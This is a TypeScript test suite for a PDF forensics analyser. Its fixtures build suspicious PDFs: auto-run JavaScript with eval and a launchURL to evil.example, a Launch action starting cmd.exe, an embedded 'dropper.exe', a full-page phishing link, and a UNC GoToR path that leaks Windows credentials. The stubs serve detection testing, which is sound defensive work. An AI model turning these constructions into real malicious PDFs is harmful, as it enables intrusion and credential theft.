import { analyzePdf } from '../src/forensics/pdf';
import { deflateRaw } from './helpers';

const enc = (s: string) => new TextEncoder().encode(s);
const cat = (extra = '') => `1 0 obj << /Type /Catalog /Pages 2 0 R ${extra} >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj`;
const pdf = (...objs: string[]) => enc(`%PDF-1.7\n${objs.join('\n')}\ntrailer << /Root 1 0 R >>\n%%EOF\n`);
const ids = (r: { anomalies: { id: string }[] }) => r.anomalies.map((a) => a.id);
const row = (r: Awaited<ReturnType<typeof analyzePdf>>, k: string) => r.report.id.find((x) => x.keyword === k)!;

describe('PDF forensics (pdfid-style counts and pdf-parser-style objects)', () => {
  it('reports nothing for a plain document', async () => {
    const r = await analyzePdf(pdf(cat(), '4 0 obj << /Length 52 >>\nstream\nBT /F1 12 Tf (Hello world, this is an ordinary letter) Tj ET\nendstream endobj'));
    expect(r.anomalies).toEqual([]);
    expect(r.report.version).toBe('1.7');
    expect(r.report.textPreview).toContain('Hello world');
    expect(row(r, '/JS').count).toBe(0);
  });

  it('finds JavaScript that runs when the file opens and its exploit-style calls', async () => {
    const r = await analyzePdf(pdf(cat('/OpenAction 5 0 R'), '5 0 obj << /S /JavaScript /JS (var s = unescape("%u9090%u9090"); eval(s); app.launchURL("https://evil.example/x"))  >> endobj'));
    expect(ids(r)).toContain('pdf-javascript');
    expect(r.anomalies.find((a) => a.id === 'pdf-javascript')!.severity).toBe('critical');
    expect(r.report.javascript[0]).toMatchObject({ trigger: 'when the file is opened' });
    expect(r.report.javascript[0]!.indicators.join(' ')).toMatch(/eval/);
    expect(r.links.map((l) => l.url)).toContain('https://evil.example/x');
    expect(row(r, '/OpenAction').count).toBe(1);
  });

  it('counts keywords written with #xx escapes as obfuscated', async () => {
    const r = await analyzePdf(pdf(cat('/OpenAction 5 0 R'), '5 0 obj << /S /J#61vaScript /JS (app.alert(1)) >> endobj'));
    expect(row(r, '/JavaScript').obfuscated).toBe(1);
    expect(ids(r)).toContain('pdf-name-obfuscation');
    expect(ids(r)).toContain('pdf-javascript');
  });

  it('sees keywords hidden inside compressed object streams', async () => {
    const inner = '6 0 << /S /JavaScript /JS (app.alert(1)) >>';
    const body = await deflateRaw(enc(inner), 'deflate');
    const head = enc(`4 0 obj << /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${body.length} >>\nstream\n`);
    const tail = enc('\nendstream endobj\n');
    const a = enc(`%PDF-1.7\n${cat('/OpenAction 6 0 R')}\n`);
    const b = enc('trailer << /Root 1 0 R >>\n%%EOF\n');
    const file = new Uint8Array(a.length + head.length + body.length + tail.length + b.length);
    let at = 0;
    for (const part of [a, head, body, tail, b]) { file.set(part, at); at += part.length; }
    const r = await analyzePdf(file);
    expect(row(r, '/JavaScript').count).toBe(0);
    expect(row(r, '/JavaScript').hiddenInStreams).toBe(1);
    expect(r.report.objectStreamsUnpacked).toBe(1);
    expect(ids(r)).toEqual(expect.arrayContaining(['pdf-hidden-keywords', 'pdf-javascript']));
  });

  it('reads the program a Launch action starts', async () => {
    const r = await analyzePdf(pdf(cat('/OpenAction 5 0 R'), '5 0 obj << /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> >> endobj'));
    expect(ids(r)).toContain('pdf-launch');
    expect(r.report.actions.find((a) => a.type === 'Launch')!.target).toBe('cmd.exe /c calc.exe');
  });

  it('extracts embedded files and says what they are', async () => {
    const exe = [0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, ...new Array(80).fill(65)];
    const body = exe.map((c) => String.fromCharCode(c)).join('');
    const r = await analyzePdf(
      enc(`%PDF-1.7\n${cat('/Names << /EmbeddedFiles << /Names [(dropper.exe) 5 0 R] >> >>')}\n5 0 obj << /Type /Filespec /F (dropper.exe) /EF << /F 6 0 R >> >> endobj\n6 0 obj << /Type /EmbeddedFile /Length ${exe.length} >>\nstream\n${body}\nendstream endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n`),
    );
    expect(ids(r)).toContain('pdf-embedded');
    expect(r.report.embedded[0]).toMatchObject({ name: 'dropper.exe' });
    expect(r.report.embedded[0]!.type).toMatch(/program/i);
    expect(r.embeddedFiles[0]!.bytes[0]).toBe(0x4d);
  });

  it('flags a link that covers the whole page', async () => {
    const r = await analyzePdf(pdf(cat(), '4 0 obj << /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A << /S /URI /URI (https://paypa1-login.top/x) >> >> endobj', '3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >> endobj'));
    expect(ids(r)).toContain('pdf-fullpage-link');
    expect(r.links.find((l) => l.url === 'https://paypa1-login.top/x')?.coversPage).toBe(true);
  });

  it('notices data before the header and after the last %%EOF', async () => {
    const body = pdf(cat());
    const junk = enc('GARBAGE\n');
    const tail = new Uint8Array(3000).fill(0x41);
    const all = new Uint8Array(junk.length + body.length + tail.length);
    all.set(junk);
    all.set(body, junk.length);
    all.set(tail, junk.length + body.length);
    const r = await analyzePdf(all);
    expect(ids(r)).toEqual(expect.arrayContaining(['pdf-junk-header', 'pdf-trailing-data']));
    expect(r.report.bytesAfterEof).toBeGreaterThan(2900);
  });

  it('reports remote file actions that leak Windows credentials', async () => {
    const r = await analyzePdf(pdf(cat('/OpenAction 5 0 R'), '5 0 obj << /S /GoToR /F (\\\\\\\\evil.example\\\\share\\\\x.pdf) >> endobj'));
    expect(ids(r)).toContain('pdf-remote-goto');
  });

  it('reads metadata', async () => {
    const r = await analyzePdf(enc(`%PDF-1.4\n${cat()}\n7 0 obj << /Producer (wkhtmltopdf 0.12) /Creator (Canva) >> endobj\ntrailer << /Root 1 0 R /Info 7 0 R >>\n%%EOF\n`));
    expect(r.report.metadata).toMatchObject({ Producer: 'wkhtmltopdf 0.12', Creator: 'Canva' });
  });
});
